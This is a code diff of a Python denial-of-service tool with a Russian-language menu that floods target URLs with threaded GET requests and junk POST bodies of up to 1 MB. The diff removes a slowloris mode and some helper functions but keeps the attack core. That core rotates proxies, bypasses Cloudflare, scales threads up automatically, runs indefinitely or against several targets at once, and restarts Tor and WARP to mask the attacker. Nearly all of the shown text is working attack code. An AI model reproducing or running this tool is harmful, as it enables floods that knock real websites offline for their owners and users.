@@ -1,3 +1,4 @@
+
 import os
 import sys
 import time
@@ -197,30 +198,10 @@ def bar(p, w=20):
     return f"[{G7 + '█' * f + E + '░' * (w - f)}] {p}%"
 
 def check_cpu():
-    """Проверка загрузки CPU"""
     try:
         return psutil.cpu_percent(interval=0.1)
     except:
         return 0
-
-# ================= ВСТРОЕННЫЙ VPN (WARP) =================
-def restart_warp():
-    try:
-        os.system("warp-cli disconnect")
-        time.sleep(2)
-        os.system("warp-cli connect")
-        time.sleep(3)
-        return True
-    except:
-        return False
-
-def restart_tor():
-    try:
-        os.system("service tor restart" if os.name != 'nt' else "taskkill /F /IM tor.exe && start tor.exe")
-        time.sleep(5)
-        return True
-    except:
-        return False
 
 # ================= БАННЕР =================
 def banner():
@@ -265,13 +246,11 @@ class Attack:
         self.proxies = proxies or []
         self.proxy_index = 0
         self.proxy_lock = threading.Lock()
-        self.mode = mode  # normal, post, slowloris, mixed
+        self.mode = mode
         self.auto_tune = auto_tune
         self.duration = duration
         self.current_threads = 0
-        self.base_url = ""
         
-        # Обход Cloudflare
         self.use_cloudscraper = use_cloudscraper and CLOUDSCRAPER_AVAILABLE
         if self.use_cloudscraper:
             self.scraper = cloudscraper.create_scraper(
@@ -299,32 +278,6 @@ class Attack:
             self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
             return proxy
 
-    def slowloris_request(self, url):
-        """Медленный запрос для забивания сокетов"""
-        try:
-            proxy = self.get_proxy()
-            headers = random_headers()
-            
-            # Открываем соединение и не закрываем
-            if self.use_cloudscraper:
-                r = self.scraper.get(url, headers=headers, proxies=proxy, stream=True, timeout=1)
-            else:
-                r = self.session.get(url, headers=headers, proxies=proxy, stream=True, timeout=1)
-            
-            # Читаем по 1 байту каждые 10 секунд
-            for chunk in r.iter_content(1):
-                if not self.running:
-                    break
-                time.sleep(10)
-            
-            with self.lock:
-                self.req += 1
-                self.ok += 1
-        except:
-            with self.lock:
-                self.req += 1
-                self.err += 1
-
     def make_request(self, url):
         try:
             proxy = self.get_proxy()
@@ -335,11 +288,9 @@ class Attack:
             if random.random() > 0.5:
                 path_url += f'#{random.randint(1000, 9999)}'
             
-            # Выбор режима атаки
             method = random.choice(['GET', 'POST']) if self.mode == "mixed" else "GET"
             
             if self.mode == "post" or method == "POST":
-                # Шлём мусор до 1 МБ
                 size = random.randint(1024, 1024*1024)
                 data = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=size))
                 
@@ -393,15 +344,7 @@ class Attack:
                 else:
                     self.err += 1
                     
-        except requests.exceptions.Timeout:
-            with self.lock:
-                self.req += 1
-                self.err += 1
-        except requests.exceptions.ConnectionError:
-            with self.lock:
-                self.req += 1
-                self.err += 1
-        except Exception:
+        except:
             with self.lock:
                 self.req += 1
                 self.err += 1
@@ -411,31 +354,23 @@ class Attack:
         self.req = self.ok = self.err = self.ban = self.bytes = 0
         self.start = time.time()
         self.current_threads = threads
-        self.base_url = url
         
         def worker():
             while self.running:
                 try:
-                    if self.mode == "slowloris":
-                        self.slowloris_request(url)
-                    else:
-                        self.make_request(url)
+                    self.make_request(url)
                 except:
                     pass
         
-        # Запускаем потоки
         for _ in range(threads):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
         
-        # Авто-тюнинг и таймер
         while self.running:
-            # Проверка таймера
             if self.duration > 0 and time.time() - self.start > self.duration:
                 self.running = False
                 break
             
-            # Авто-тюнинг (увеличение потоков при низкой нагрузке)
             if self.auto_tune and self.err < 10:
                 cpu = check_cpu()
                 if cpu < 80 and self.current_threads < MAX_THREADS:
@@ -447,7 +382,6 @@ class Attack:
             
             time.sleep(0.1)
         
-        # Очистка
         for t in threading.enumerate():
             if t != threading.current_thread() and t.is_alive():
                 try:
@@ -534,28 +468,20 @@ def single_attack():
     if not url.startswith('http'):
         url = 'http://' + url
     
-    # Выбор режима
     print(f"""
 {G6}Выбери режим атаки:
 {G5}1.{W} NORMAL (GET запросы)
 {G5}2.{W} POST (мусорные данные)
-{G5}3.{W} SLOWLORIS (медленные соединения)
-{G5}4.{W} MIXED (GET + POST){E}
+{G5}3.{W} MIXED (GET + POST){E}
 """)
     mode_choice = input(f"{G7}Режим: {W}")
-    modes = {'1': 'normal', '2': 'post', '3': 'slowloris', '4': 'mixed'}
+    modes = {'1': 'normal', '2': 'post', '3': 'mixed'}
     mode = modes.get(mode_choice, 'normal')
     
     threads = safe_int(f"{G6}Потоки (1-{MAX_THREADS}): {W}", 100, 1, MAX_THREADS)
-    
-    # Время атаки
     duration = safe_int(f"{G6}Время атаки (сек, 0 = бесконечно): {W}", 0, 0, 3600)
-    
-    # Авто-тюнинг
-    auto_tune = input(f"{G6}Авто-тюнинг (увеличивать потоки при низкой нагрузке)? (y/n): {W}").lower() == 'y'
-    
-    # Обход Cloudflare
-    use_cf = CLOUDSCRAPER_AVAILABLE and input(f"{G6}Использовать обход Cloudflare? (y/n): {W}").lower() == 'y'
+    auto_tune = input(f"{G6}Авто-тюнинг? (y/n): {W}").lower() == 'y'
+    use_cf = CLOUDSCRAPER_AVAILABLE and input(f"{G6}Обход Cloudflare? (y/n): {W}").lower() == 'y'
     
     proxies = load_proxies()
     if not proxies:
@@ -632,16 +558,14 @@ def combo_attack():
     
     threads_per_target = safe_int(f"{G6}Потоков на цель (1-{MAX_THREADS}): {W}", 50, 1, MAX_THREADS)
     
-    # Выбор режима
     print(f"""
 {G6}Выбери режим атаки:
 {G5}1.{W} NORMAL (GET запросы)
 {G5}2.{W} POST (мусорные данные)
-{G5}3.{W} SLOWLORIS (медленные соединения)
-{G5}4.{W} MIXED (GET + POST){E}
+{G5}3.{W} MIXED (GET + POST){E}
 """)
     mode_choice = input(f"{G7}Режим: {W}")
-    modes = {'1': 'normal', '2': 'post', '3': 'slowloris', '4': 'mixed'}
+    modes = {'1': 'normal', '2': 'post', '3': 'mixed'}
     mode = modes.get(mode_choice, 'normal')
     
     duration = safe_int(f"{G6}Время атаки (сек, 0 = бесконечно): {W}", 0, 0, 3600)
@@ -754,16 +678,21 @@ def main():
             combo_attack()
         elif ch == '3':
             print(f"{G6}Перезапуск WARP...{E}")
-            if restart_warp():
+            try:
+                os.system("warp-cli disconnect && warp-cli connect")
                 print(f"{G7}✅ WARP перезапущен{E}")
-            else:
+            except:
                 print(f"{R}❌ Ошибка! Установи WARP{E}")
             time.sleep(2)
         elif ch == '4':
             print(f"{G6}Перезапуск Tor...{E}")
-            if restart_tor():
+            try:
+                if os.name == 'nt':
+                    os.system("taskkill /F /IM tor.exe && start tor.exe")
+                else:
+                    os.system("service tor restart")
                 print(f"{G7}✅ Tor перезапущен{E}")
-            else:
+            except:
                 print(f"{R}❌ Ошибка! Установи Tor{E}")
             time.sleep(2)
         elif ch == '99':
